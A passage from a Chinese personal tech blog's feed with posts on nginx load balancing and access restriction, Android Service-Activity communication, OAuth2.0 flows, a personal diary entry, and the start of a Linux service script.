        # 静态文件可以用CDN处理，本例子指向WEB3
        location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ {
            proxy_pass http://static.homeway;
        }

        # 通过均衡负载服务器指向WEB1、WEB2 
        location / {
            proxy_pass http://homeway;  #使用后端的web服务器  
            proxy_redirect off;    
            proxy_set_header Host $host;    
            proxy_set_header X-Real-IP $remote_addr;    
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;    
            client_max_body_size 10m;    
            client_body_buffer_size 128k;    
            proxy_connect_timeout 90;    
            proxy_send_timeout 90;    
            proxy_read_timeout 90;    
            proxy_buffer_size 4k;    
            proxy_buffers 4 32k;    
            proxy_busy_buffers_size 64k;    
            proxy_temp_file_write_size 64k;
        }
        access_log  /home/wwwlogs/access.log  access;
    }
    include vhost/*.conf;
}
</code></pre><p>核心指令”ip_hash”只能在upstream {}中使用。这条指令用于通知nginx使用ip hash负载均衡算法。如果没加这条指令，nginx会使用默认的round robin负载均衡模块，那么，你每次访问的服务器可能会不同，导致session丢失，一直要重新登录。</p>
<p>关于upstream的源码分析，可以去看 tengine的介绍 <a href="http://tengine.taobao.org/book/chapter_05.html" target="_blank" rel="external">http://tengine.taobao.org/book/chapter_05.html</a></p>
<p>重启服务器下。</p>
<blockquote>
<p>/root/lnmp restart</p>
</blockquote>
<p>搞定了，确定WEB1，WEB2,WEB3可以正常访问就行了。</p>
<p>这样，假设，我在WEB1的web目录下放一个 fuck.php, WEB2不放，那么。当我访问<a href="http://172.31.19.122时候，就会有时候404，有时候返回正常页面，这就表示成功了。" target="_blank" rel="external">http://172.31.19.122时候，就会有时候404，有时候返回正常页面，这就表示成功了。</a></p>
<p><br><hr><br></p>
<h1 id="0x05-关于服务性能"><a href="#0x05-关于服务性能" class="headerlink" title="0x05.关于服务性能"></a>0x05.关于服务性能</h1><p>这个在目前不能做，因为无法做多用户并发访问，就算模拟器模拟效果也不能达到多用户并发的强度。</p>
<p>Nginx的几个优点：</p>
<ul>
<li><p>Nginx工作在网络的7层，所以它可以针对http应用本身来做分流策略，比如针对域名、目录结构等，相比之下LVS并不具备这样的功能，所以Nginx单凭这点可利用的场合就远多于LVS了；但Nginx有用的这些功能使其可调整度要高于LVS，所以经常要去触碰触碰，触碰多了，人为出问题的几率也就会大。</p>
</li>
<li><p>Nginx现在作为Web反向加速缓存越来越成熟了，速度比传统的Squid服务器更快，可以考虑用其作为反向代理加速器。    </p>
</li>
<li>Nginx对网络稳定性的依赖非常小，理论上能ping通就就能进行负载功能，这个也是它的优势之一。</li>
</ul>
<p><br><hr><br></p>
<p>接下来会写关于KeepAlive+HAProxy实践教程。</p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-12-05-nginx-reverse-proxy-to-load-balance"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-12-05-nginx-reverse-proxy-to-load-balance" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/12/05/nginx-reverse-proxy-to-load-balance/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/12/05/nginx-reverse-proxy-to-load-balance/">http://homeway.me/2014/12/05/nginx-reverse-proxy-to-load-balance/</a></h4><p><br></p>
<p>-by小草</p>
<p>2014-12-05 17:12:26</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Android之Service与Activity通信机制]]></title>
      <url>http://homeway.me/2014/12/02/android-service-share-data-with-activity/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-android.png" alt="android"></p>
<a id="more"></a>
<p><br></p>
<h4 id="关于Android之Service与Activity通信机制。"><a href="#关于Android之Service与Activity通信机制。" class="headerlink" title="关于Android之Service与Activity通信机制。"></a>关于Android之Service与Activity通信机制。</h4><h4 id="接下来研究下Service事件队列原理，待续。"><a href="#接下来研究下Service事件队列原理，待续。" class="headerlink" title="接下来研究下Service事件队列原理，待续。"></a>接下来研究下Service事件队列原理，待续。</h4><p><br><hr><br></p>
<h1 id="0x01-Service生命周期"><a href="#0x01-Service生命周期" class="headerlink" title="0x01.Service生命周期"></a>0x01.Service生命周期</h1><p>看一张网上的关于Service的生命周期</p>
<p><img src="/image/2014-12-01-android-service-lifecycle.jpg" alt="Service生命周期"></p>
<p><br></p>
<p>Service主要包含本地类和远程类。</p>
<p><img src="/image/2014-12-01-android-service-type.png" alt="Service生命周期"></p>
<p><br></p>
<p>Service主要在后台运行，我们可以在这里做网络状态监测，地理位置监测，以及系统状态监测等，然后通过broadcast广播，发送给前台进行处理。</p>
<p>Service不是Thread，Service 是android的一种机制，当它运行的时候如果是Local Service，那么对应的 Service 是运行在主进程的 main 线程上的。如：onCreate，onStart 这些函数在被系统调用的时候都是在主进程的 main 线程上运行的。如果是Remote Service，那么对应的 Service 则是运行在独立进程的 main 线程上。</p>
<p><br><hr><br></p>
<h1 id="0x02-Service的基本用法"><a href="#0x02-Service的基本用法" class="headerlink" title="0x02.Service的基本用法"></a>0x02.Service的基本用法</h1><p><br></p>
<p>启动service的方法很简单，首先在AndroidManifest.xml中注册才行。</p>
<pre><code>&lt;application  
    android:allowBackup=&quot;true&quot;  
    android:icon=&quot;@drawable/ic_launcher&quot;  
    android:label=&quot;@string/app_name&quot;  
    android:theme=&quot;@style/AppTheme&quot; &gt;  
    &lt;service android:name=&quot;me.homeway.servicebinder.MainService&quot; &gt;  
    &lt;/service&gt;  
&lt;/application&gt;
</code></pre><p><br></p>
<p>其次，要在Activity运行时候调用Intent对象生成Service。</p>
<pre><code>Intent startIntent = new Intent(MainActivity.this, MainService.class);    
startService(startIntent); 
</code></pre><p><br></p>
<p>下面是service的基本调用方式，重写onCreate()、onStartCommand()和onDestroy()方法。</p>
<p>onCreate()只启动一次，onStartCommand()会在每次启动activity时候运行，onDestroy()只在service关闭时候运行。</p>
<pre><code>public class MainService extends Service {
    @Override
    public void onCreate() {
        super.onCreate();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return super.onStartCommand(intent, flags, startId);
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

}
</code></pre><h1 id="0x03-Service通过IBinder与Activity通信"><a href="#0x03-Service通过IBinder与Activity通信" class="headerlink" title="0x03.Service通过IBinder与Activity通信"></a>0x03.Service通过IBinder与Activity通信</h1><p>下面是主要源码。</p>
<blockquote>
<p>MainService.java</p>
</blockquote>
<pre><code>public class MainService extends Service{

    private String TAG = &quot;MainService&quot;;
    public ServiceBinder mBinder = new ServiceBinder(); /* 数据通信的桥梁 */

    /* 重写Binder的onBind函数，返回派生类 */
    @Override
    public IBinder onBind(Intent arg0) {
        return mBinder;
    }

    @Override
    public void onCreate() {    
        Toast.makeText( MainService.this, &quot;Service Create...&quot;, Toast.LENGTH_SHORT).show();
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(MainService.this, &quot;Service StartCommand&quot;, Toast.LENGTH_SHORT).show();
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {    
            Toast.makeText( MainService.this, &quot;Service Destroy&quot;, Toast.LENGTH_SHORT).show();
    }

    /* 第一种模式通信：Binder */
    public class ServiceBinder extends Binder { 

        public void startDownload() throws InterruptedException {  
            /* 模拟下载，休眠2秒 */
            Toast.makeText( MainService.this, &quot;模拟下载2秒钟,开始下载...&quot;, Toast.LENGTH_SHORT).show();
            Thread.sleep(2);
            Toast.makeText( MainService.this, &quot;下载结束...&quot;, Toast.LENGTH_SHORT).show();
        }
    }
}
</code></pre><p><br></p>
<blockquote>
<p>MainActivity.java</p>
</blockquote>
<pre><code>public class MainActivity extends Activity {
    /* 通过Binder，实现Activity与Service通信 */
    private MainService.ServiceBinder mBinderService;
    private ServiceConnection connection = new ServiceConnection() {  
        @Override  
        public void onServiceDisconnected(ComponentName name) {  
        }  

        @Override  
        public void onServiceConnected(ComponentName name, IBinder service) {  
            mBinderService = (MainService.ServiceBinder) service;
            try {
                mBinderService.startDownload();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }  
        }  
    };

    @Override
       public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main); 

        Intent bindIntent = new Intent(MainActivity.this, MainService.class);  
        bindService(bindIntent, connection, BIND_AUTO_CREATE); 
    }
}    
</code></pre><p><br><hr><br></p>
<h1 id="0x04-Service通过BroadCast广播与Activity通信"><a href="#0x04-Service通过BroadCast广播与Activity通信" class="headerlink" title="0x04.Service通过BroadCast广播与Activity通信"></a>0x04.Service通过BroadCast广播与Activity通信</h1><p>关于广播的原理。</p>
<p><img src="/image/2014-12-01-broadcast.png" alt="Android 广播原理"></p>
<p><br></p>
<blockquote>
<p>MainService.java</p>
</blockquote>
<pre><code>public class MainService extends Service{

    private String TAG = &quot;MainService&quot;;
    public ServiceBinder mBinder = new ServiceBinder(); /* 数据通信的桥梁 */

    /* 重写Binder的onBind函数，返回派生类 */
    @Override
    public IBinder onBind(Intent arg0) {
        return null;
    }

    @Override
    public void onCreate() {    
        Toast.makeText( MainService.this, &quot;Service Create, Send BroadCast...&quot;, Toast.LENGTH_SHORT).show();
        SendServiceBroadCast();
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Toast.makeText(MainService.this, &quot;Service StartCommand&quot;, Toast.LENGTH_SHORT).show();
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {    
            Toast.makeText( MainService.this, &quot;Service Destroy&quot;, Toast.LENGTH_SHORT).show();
    }

    /* 第二种模式通信：Broadcast广播 */
    public void SendServiceBroadCast() throws InterruptedException {  
        Log.d(TAG, &quot;ServiceThread===&gt;&gt;startDownload() executed===&gt;&gt;线程ID:&quot;+Thread.currentThread().getId());  
        Toast.makeText( MainService.this, &quot;Send BroadCast now...&quot;, Toast.LENGTH_SHORT).show();
        Intent intent = new Intent();
            intent.setAction(&quot;me.homeway.servicebinder.BroadcastTest&quot;);
            intent.putExtra(&quot;value&quot;, 1000);
            sendBroadcast(intent);
            Toast.makeText( MainService.this, &quot;Sent! Did you receive?&quot;, Toast.LENGTH_SHORT).show();
    }
}
</code></pre><p><br></p>
<p>新建一个类，命名成 BroadcastTest.java 放在 me.homeway.servicebinder 包里面。</p>
<p>这里我们使用静态注册方式，所以要在AndroidManifest.xml中注册广播。</p>
<blockquote>
<p>AndroidManifest.xml</p>
</blockquote>
<p><br></p>
<pre><code>&lt;application
    android:allowBackup=&quot;true&quot;
    android:icon=&quot;@drawable/ic_launcher&quot;
    android:label=&quot;@string/app_name&quot;&gt;

    &lt;receiver android:name=&quot;.BroadcastTest&quot;&gt;
        &lt;intent-filter&gt;
            &lt;action android:name=&quot;me.homeway.servicebinder.BroadcastTest&quot;&gt;&lt;/action&gt;
        &lt;/intent-filter&gt;
    &lt;/receiver&gt;
    ...    
&lt;/application&gt;
</code></pre><p><br></p>
<blockquote>
<p>BroadcastTest.java</p>
</blockquote>
<pre><code>public class BroadcastTest extends BroadcastReceiver{

    private NetworkInfo netInfo;
    private ConnectivityManager mConnectivityManager;

    public void onReceive(Context context, Intent intent) {
        Bundle extras = intent.getExtras();
        if (extras != null) {
            if(extras.containsKey(&quot;value&quot;)){
                /* 这里可以做下载，发包等事件 */
                Toast.makeText( context, &quot;收到广播 =&gt; &quot;+extras.get(&quot;value&quot;), Toast.LENGTH_SHORT).show();
                System.out.println(&quot;Value is:&quot;+extras.get(&quot;value&quot;));
            }
        }      
       }
}
</code></pre><div style="width:100%;"><br><br>    <img style="width:45%;" alt="效果图" src="/image/2014-12-01-android-servic-1.jpg"><br>    <img style="width:45%;" alt="效果图" src="/image/2014-12-01-android-servic-2.jpg"><br><br></div>

<p><br><hr><br>    </p>
<h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05.参考"></a>0x05.参考</h1><p>0x01. <a href="http://www.vogella.com/tutorials/AndroidServices/article.html" target="_blank" rel="external">http://www.vogella.com/tutorials/AndroidServices/article.html</a></p>
<p>0x02.<a href="http://blog.csdn.net/guolin_blog/article/details/11952435" target="_blank" rel="external">http://blog.csdn.net/guolin_blog/article/details/11952435</a></p>
<p>0x03.<a href="http://www.tutorialspoint.com/android/android_services.htm" target="_blank" rel="external">http://www.tutorialspoint.com/android/android_services.htm</a>    </p>
<p><br><hr><br></p>
<h1 id="0x06-送福利"><a href="#0x06-送福利" class="headerlink" title="0x06.送福利"></a>0x06.送福利</h1><p>关于程序问题，欢迎联系我。<a href="mailto://xiaocao.grasses@gmail.com" target="_blank" rel="external">xiaocao.grasses@gmail.com</a></p>
<p>源码下载这里: <a href="/code/ServiceBinder.zip">ServiceBinder.zip</a></p>
<p>APK下载：<a href="/code/ServiceBinder.apk">ServiceBinder.apk</a></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-12-02-android-service-share-data-with-activity"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-12-02-android-service-share-data-with-activity" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/12/02/android-service-share-data-with-activity/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/12/02/android-service-share-data-with-activity/">http://homeway.me/2014/12/02/android-service-share-data-with-activity/</a></h4><p><br></p>
<p>-by小草</p>
<p>2014-12-02 01:27:34</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[为Nginx添加访问限制]]></title>
      <url>http://homeway.me/2014/11/11/nginx-http-auth-request-module/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/2014-11-11-nginx.png" alt="nginx-http-auth-request-module"></p>
<a id="more"></a>
<p><br></p>
<h4 id="为Nginx访问限制，主要涉及到这几个模块"><a href="#为Nginx访问限制，主要涉及到这几个模块" class="headerlink" title="为Nginx访问限制，主要涉及到这几个模块:"></a>为Nginx访问限制，主要涉及到这几个模块:</h4><h4 id="ngx-http-access-module"><a href="#ngx-http-access-module" class="headerlink" title="ngx_http_access_module,"></a>ngx_http_access_module,</h4><h4 id="ngx-http-auth-basic-module"><a href="#ngx-http-auth-basic-module" class="headerlink" title="ngx_http_auth_basic_module"></a>ngx_http_auth_basic_module</h4><h4 id="ngx-http-auth-request-module"><a href="#ngx-http-auth-request-module" class="headerlink" title="ngx_http_auth_request_module"></a>ngx_http_auth_request_module</h4><p><br><hr><br></p>
<h1 id="0x01-ngx-http-access-module"><a href="#0x01-ngx-http-access-module" class="headerlink" title="0x01.ngx_http_access_module"></a>0x01.ngx_http_access_module</h1><p>access模块很简单，只要直接像apache一样添加访问限制就好了。</p>
<pre><code>location / {
    deny  192.168.1.1;
    allow 192.168.1.0/24;
    allow 10.1.1.0/16;
    allow 2001:0db8::/32;
    deny  all;
}
</code></pre><h1 id="0x02-ngx-http-auth-basic-module-amp-ngx-http-auth-request-module"><a href="#0x02-ngx-http-auth-basic-module-amp-ngx-http-auth-request-module" class="headerlink" title="0x02.ngx_http_auth_basic_module &amp; ngx_http_auth_request_module"></a>0x02.ngx_http_auth_basic_module &amp; ngx_http_auth_request_module</h1><p>ngx_http_auth_request_module不是内置模块，你需要下载模块，并重新编译安装nginx.</p>
<p>先下载模块：</p>
<blockquote>
<p>git clone git://github.com/perusio/nginx-auth-request-module.git</p>
</blockquote>
<p>编译nginx</p>
<blockquote>
<p>./configure –add-module=/path/to/ngx_http_auth_request_module</p>
<p>make &amp;&amp; make install</p>
</blockquote>
<p>ngx_http_auth_basic_module需要提前添加密码。</p>
<blockquote>
<p>htpasswd -c /usr/local/nginx/auth_passwd xxx</p>
</blockquote>
<p>这个时候，你就为 xxx 这个用户名设置了密码，访问时候，就要求输入用户名密码。</p>
<p>然后改下配置文件。</p>
<pre><code>location / {
    auth_basic           &quot;Don`t fuck me!&quot;;
    auth_basic_user_file /usr/local/nginx/auth_passwd;
    auth_request /auth;
       auth_request_set $my_error_page $upstream_http_x_error_page;
}
</code></pre><p>记得重启nginx。</p>
<blockquote>
<p>service nginx restart</p>
</blockquote>
<p>这个时候，如果用户名，密码错误，会返回:</p>
<p><img src="/image/2014-11-11-nginx-access-auth.png" alt="401"></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2014-11-11-nginx-http-auth-request-module"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2014-11-11-nginx-http-auth-request-module" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2014/11/11/nginx-http-auth-request-module"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2014/11/11/nginx-http-auth-request-module">http://homeway.me/2014/11/11/nginx-http-auth-request-module</a></h4><p>by 小草</p>
<p>2014-11-11 23:46:38</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[403.Forbidden]]></title>
      <url>http://homeway.me/2014/11/08/403-Forbidden/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="/image/2014-11-08-403.forbidden-1.gif" alt="403.forbidden"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-About-Recent"><a href="#0x01-About-Recent" class="headerlink" title="0x01.About Recent"></a>0x01.About Recent</h1><p>这么冷的天，来一碗热腾腾的面是最适合的了。</p>
<p>外面的东西好吃，终究还是会想家里的饭菜。</p>
<p>可能是突然来的雨天，抑或是冷空气袭来太急，一时间没有适应过来。</p>
<p>最近的最近，一直没有很好的状态。</p>
<p>很久没去散散步，静静心，看看风景了吧，喜欢那样的时候，那样的散着步，慢悠悠的样子。</p>
<p>感觉思维一直阻塞在一个坑里，突然就有一种自己一个人孤军奋战的感觉。</p>
<p>可能最近的最近的，该狂吃一顿了。</p>
<p><br><hr><br></p>
<h1 id="0x02-Mood"><a href="#0x02-Mood" class="headerlink" title="0x02.Mood"></a>0x02.Mood</h1><p>买的I6，等了一个礼拜还没有到，靠自己的能力，买想要的东西，有一种很自豪的感觉。</p>
<p>想到暑假回家，看到爸妈都老了的样子，心里的滋味很难表达。</p>
<p>离家的孩子，终究还是会想家。</p>
<p>想想大学三年，最庆幸的是，自己走上对的路，没有浪费青春的时光。</p>
<p>想想自己，玩也玩的蛮尽兴，游山玩水，去了很多地方。</p>
<p>很可惜的是，从没当过一回学霸，一回也没有。</p>
<p>遗憾的事是，没有把够妹 &gt;._.&lt; ……</p>
<p>时常羡慕别人的生活，然后，有时候，你会发现，其实，你的生活也蛮让人羡慕的。</p>
<p>看到大一的，已经开始入座协会，突然有一种自己已经老了的感觉。</p>
<p>也许也正是这样，思绪一直在问自己，未来何去何从。</p>
<p>其实，后来想想，ss说的也对，该去玩点业余爱好。</p>
<p>大概未来的未来，会去寻找兴趣。</p>
<p><br><hr><br></p>
<p><img src="/image/2014-11-08-403-1.jpg" alt=""></p>
<h1 id="0x03-Future"><a href="#0x03-Future" class="headerlink" title="0x03.Future"></a>0x03.Future</h1><p>希望状态能赶快改变。</p>
<p>我还是想要之前那种，一直保持很积极乐观的状态，很多事情，一个一个Kill掉。</p>
<p>我希望一觉醒来，状态饱满。</p>
<p><img src="/image/2014-11-08-403-2.jpg" alt=""></p>
<p>– 小草</p>
<p>2014-11-08 19:02:57</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Oauth2.0原理]]></title>
      <url>http://homeway.me/2014/11/05/how-oauth2-work-1/</url>
      <content type="html"><![CDATA[<p><br></p>
<h4 id="Oauth2-0是第三方接入的一个安全协议"><a href="#Oauth2-0是第三方接入的一个安全协议" class="headerlink" title="Oauth2.0是第三方接入的一个安全协议"></a>Oauth2.0是第三方接入的一个安全协议</h4><h4 id="今天查了查Oauth2-0接入原理，感觉挺有意思的"><a href="#今天查了查Oauth2-0接入原理，感觉挺有意思的" class="headerlink" title="今天查了查Oauth2.0接入原理，感觉挺有意思的"></a>今天查了查Oauth2.0接入原理，感觉挺有意思的</h4><a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-关于Oauth"><a href="#0x01-关于Oauth" class="headerlink" title="0x01.关于Oauth"></a>0x01.关于Oauth</h1><p>Oauth是允许用户让第三方应用访问该用户在某一网站上存储的私密的资源（如照片，视频，联系人列表），而无需将用户名和密码提供给第三方应用的协议。</p>
<p>例如我们想要获取github的用户账号信息。</p>
<p><img src="https://static.blog.homeway.me/blog/2014-11-04-oauth2_0-01.gif" alt="oauth2.0请求"></p>
<p><br></p>
<p>进入到github就能看到，你授权的账号信息了。</p>
<p><img src="https://static.blog.homeway.me/blog/2014-11-04-oauth2_0-06.gif" alt="github授权账号信息"></p>
<p><br><hr><br></p>
<h1 id="0x02-Oauth2-0成员"><a href="#0x02-Oauth2-0成员" class="headerlink" title="0x02.Oauth2.0成员"></a>0x02.Oauth2.0成员</h1><ul>
<li><h4 id="Resource-Owner（资源拥有者：用户）"><a href="#Resource-Owner（资源拥有者：用户）" class="headerlink" title="Resource Owner（资源拥有者：用户）"></a>Resource Owner（资源拥有者：用户）</h4></li>
<li><h4 id="Client-（第三方接入平台：请求者）"><a href="#Client-（第三方接入平台：请求者）" class="headerlink" title="Client （第三方接入平台：请求者）"></a>Client （第三方接入平台：请求者）</h4></li>
<li><h4 id="Resource-Server-（服务器资源：数据中心）"><a href="#Resource-Server-（服务器资源：数据中心）" class="headerlink" title="Resource Server （服务器资源：数据中心）"></a>Resource Server （服务器资源：数据中心）</h4></li>
<li><h4 id="Authorization-Server-（认证服务器）"><a href="#Authorization-Server-（认证服务器）" class="headerlink" title="Authorization Server （认证服务器）"></a>Authorization Server （认证服务器）</h4></li>
</ul>
<p><br></p>
<p>从成员看Oauth2.0基本流程。</p>
<p><img src="https://static.blog.homeway.me/blog/2014-11-04-oauth2_0-02.png" alt="Oauth2.0基本流程"></p>
<p><br></p>
<p>原理很简单，用户访问App，App访问Authorization Server请求权限，</p>
<p>Authorization Server得到用户同意后，返回token，</p>
<p>App通过这个token向Authorization Server索要数据，</p>
<p>App只能从Authorization Server这个中介获取服务器数据，而无法直接访问Resource Server。</p>
<p><br><hr><br></p>
<h1 id="0x03-Oauth2-0类型"><a href="#0x03-Oauth2-0类型" class="headerlink" title="0x03.Oauth2.0类型"></a>0x03.Oauth2.0类型</h1><h3 id="关于Oauth使用情况"><a href="#关于Oauth使用情况" class="headerlink" title="关于Oauth使用情况"></a>关于Oauth使用情况</h3><p>Oauth用权限大小可以分为：</p>
<ul>
<li><h4 id="基础公开的API：站外网站，站外应用等"><a href="#基础公开的API：站外网站，站外应用等" class="headerlink" title="基础公开的API：站外网站，站外应用等"></a>基础公开的API：站外网站，站外应用等</h4></li>
<li><h4 id="基础公开的API-用户资料：站内应用，移动App，站外使用账号登录"><a href="#基础公开的API-用户资料：站内应用，移动App，站外使用账号登录" class="headerlink" title="基础公开的API+用户资料：站内应用，移动App，站外使用账号登录"></a>基础公开的API+用户资料：站内应用，移动App，站外使用账号登录</h4></li>
<li><h4 id="基础公开的API-用户所有权限：直接输入密码（Oauth1-0）"><a href="#基础公开的API-用户所有权限：直接输入密码（Oauth1-0）" class="headerlink" title="基础公开的API+用户所有权限：直接输入密码（Oauth1.0）"></a>基础公开的API+用户所有权限：直接输入密码（Oauth1.0）</h4></li>
</ul>
<p><br></p>
<h3 id="关于Oauth提权类型"><a href="#关于Oauth提权类型" class="headerlink" title="关于Oauth提权类型"></a>关于Oauth提权类型</h3><ul>
<li><h4 id="authorization-code（Oauth提供的token代码）：-Web-server、apps"><a href="#authorization-code（Oauth提供的token代码）：-Web-server、apps" class="headerlink" title="authorization_code（Oauth提供的token代码）： Web-server、apps"></a>authorization_code（Oauth提供的token代码）： Web-server、apps</h4></li>
</ul>
<p><img src="https://static.blog.homeway.me/blog/2014-11-04-oauth2_0-04.png" alt="authorization_code模式"></p>
<p><br></p>
<ul>
<li><h4 id="implicit-简单模式-：Browser-based-apps，Mobile-apps"><a href="#implicit-简单模式-：Browser-based-apps，Mobile-apps" class="headerlink" title="implicit(简单模式)：Browser-based apps，Mobile apps"></a>implicit(简单模式)：Browser-based apps，Mobile apps</h4></li>
</ul>
<p><img src="https://static.blog.homeway.me/blog/2014-11-04-oauth2_0-05.png" alt="implicit模式"></p>
<p><br></p>
<ul>
<li><h4 id="password（密码模式）：Username-password-access"><a href="#password（密码模式）：Username-password-access" class="headerlink" title="password（密码模式）：Username/password access"></a>password（密码模式）：Username/password access</h4></li>
<li><h4 id="client-credentials（客户端模式）：Application-access"><a href="#client-credentials（客户端模式）：Application-access" class="headerlink" title="client_credentials（客户端模式）：Application access"></a>client_credentials（客户端模式）：Application access</h4></li>
</ul>
<p>其实第一种和第二中是一样的，都是用Oauth Server提供的token实现资源获取，只是获取的资源类型不一样，权限不一样。</p>
<p>authorization_code对应上面讲到得，获取基础公开API，</p>
<p>implicit对应第二种，获取用户信息。</p>
<p>password是种不安全的方式。</p>
<p>client_credentials是不需要Oauth认证的，即直接访问该网站提供的开放的API。</p>
<p><br></p>
<h3 id="看看例子，从网上偷下来的facebook的Oauth2-0认证："><a href="#看看例子，从网上偷下来的facebook的Oauth2-0认证：" class="headerlink" title="看看例子，从网上偷下来的facebook的Oauth2.0认证："></a>看看例子，从网上偷下来的facebook的Oauth2.0认证：</h3><p><img src="https://static.blog.homeway.me/blog/2014-11-04-oauth2_0-03.jpg" alt="facebook Oauth2.0"></p>
<p>第一步：</p>
<p>App向 Oauth Server 请求的URL =&gt; <code>https://facebook.com/dialog/oauth?response_type=code&amp;client_id=YOUR_CLIENT_ID&amp;redirect_uri=REDIRECT_URI&amp;scope=email</code></p>
<p>里面带着该app的id，key，请求的类型，返回一串的access_token和事件类型code。</p>
<p>第二步：</p>
<p>回调，跳转到权限确认页面等待用户确认授权 =&gt; <code>https://facebook.com/dialog/oauth?response_type=code&amp;client_id=28653682475872&amp;redirect_uri=example.com&amp;scope=email</code></p>
<p>该页面通过<code>redirect_uri</code>，回调到指定的callback页面。</p>
<p>第三步：</p>
<p>利用返回的access_token，将app的id和key以及code代码发包到：<code>POST https://graph.facebook.com/oauth/access_token</code></p>
<p>这一步是为了获取token。</p>
<p>第四步：</p>
<p>Oauth Server返回token，这个时候，就可以通过token获取用户授权的资源了。</p>
<p><br><hr><br></p>
<p>资料参考: </p>
<p><a href="http://oauth.net/2/" target="_blank" rel="external">http://oauth.net/2/</a></p>
<p><a href="https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2" target="_blank" rel="external">https://www.digitalocean.com/community/tutorials/an-introduction-to-oauth-2</a></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-11-05-how-oauth2-work-1"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2014-11-05-how-oauth2-work-1" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2014/11/05/how-oauth2-work-1/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2014/11/05/how-oauth2-work-1/">http://homeway.me/2014/11/05/how-oauth2-work-1/</a></h4><p><br></p>
<p>-by小草</p>
<p>2014-11-05 01:37:08</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[用shell写个service启动程序]]></title>
      <url>http://homeway.me/2014/10/29/linux-shell-write-service/</url>
      <content type="html"><![CDATA[<p><br></p>
<h4 id="我们经常会用到service-httpd-d-start，service-mysql-start"><a href="#我们经常会用到service-httpd-d-start，service-mysql-start" class="headerlink" title="我们经常会用到service httpd.d start，service mysql start"></a>我们经常会用到service httpd.d start，service mysql start</h4><h4 id="那么service到底是怎么工作的呢？"><a href="#那么service到底是怎么工作的呢？" class="headerlink" title="那么service到底是怎么工作的呢？"></a>那么service到底是怎么工作的呢？</h4><a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-关于service"><a href="#0x01-关于service" class="headerlink" title="0x01.关于service"></a>0x01.关于service</h1><p>打开terminal，输入 <code>ls /etc/init.d/</code>可以看到很多文件。</p>
<p>这些就是我们常用到的service 命令集合，其实就是Linux Shell执行脚本。</p>
<p>我们经常用service开启服务，原理就是，开启服务线程，终止服务线程。</p>
<p>service基础格式如下：</p>
<pre><code># /bin/sh

start(){}
stop(){}
reload(){}
status(){}

case &quot;$1&quot; in
    start)
            start 
            ;;
    stop)
            stop 
            ;;
    restart)
            stop
            start
            ;;
    reload)
            reload
    ;;
    status)
            status
            ;;
    *)
            echo $&quot;Usage: $0 {start|stop|restart|reload|status}&quot; 
esac
</code></pre><p>可以看出来，这个service包含了{start|stop|restart|reload|status}等几个参数命令。</p>
<p><br></p>
<p><code>$1</code>是脚本的一个参数，关于linux shell参数，看下面：</p>
<pre><code>*     $0 ： ./homeway.sh,即命令本身，相当于C/C++中的argv[0]
*    $1 ： -f,第一个参数.
*    $2 ： config.conf
*    $3, $4 ... ：类推。
*    $#  参数的个数，不包括命令本身，上例中$#为4.
*    $@ ：参数本身的列表，也不包括命令本身，如上例为 -f config.conf -v --prefix=/home
*    $* ：和$@相同，但&quot;$*&quot; 和 &quot;$@&quot;(加引号)并不同，&quot;$*&quot;将所有的参数解释成一个字符串，而&quot;$@&quot;是一个参数数组。
</code></pre><h1 id="0x02-写一个nginx启动service"><a href="#0x02-写一个nginx启动service" class="headerlink" title="0x02.写一个nginx启动service"></a>0x02.写一个nginx启动service</h1><h4 id="先配置变量"><a href="#先配置变量" class="headerlink" title="* 先配置变量"></a>* 先配置变量</h4><pre><code>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
NAME=nginx
NGINX_BIN=/usr/local/nginx/sbin/$NAME
